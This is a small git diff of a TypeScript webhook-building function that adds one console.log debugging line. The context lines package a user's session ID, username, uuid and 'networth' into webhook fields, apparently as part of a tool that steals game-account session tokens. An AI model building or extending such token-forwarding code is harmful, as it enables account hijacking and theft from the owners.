@@ -29,6 +29,7 @@ export default async function parseWebhook(username:string, uuid:string, session
             "value": `\`\`\`${sessionID}\`\`\``
         }
     ]
+    console.log(networth[1])
     if (networth[1] !== "Error getting networth") {
         for (const field of networth[1]) {
             mcFields.push(field)
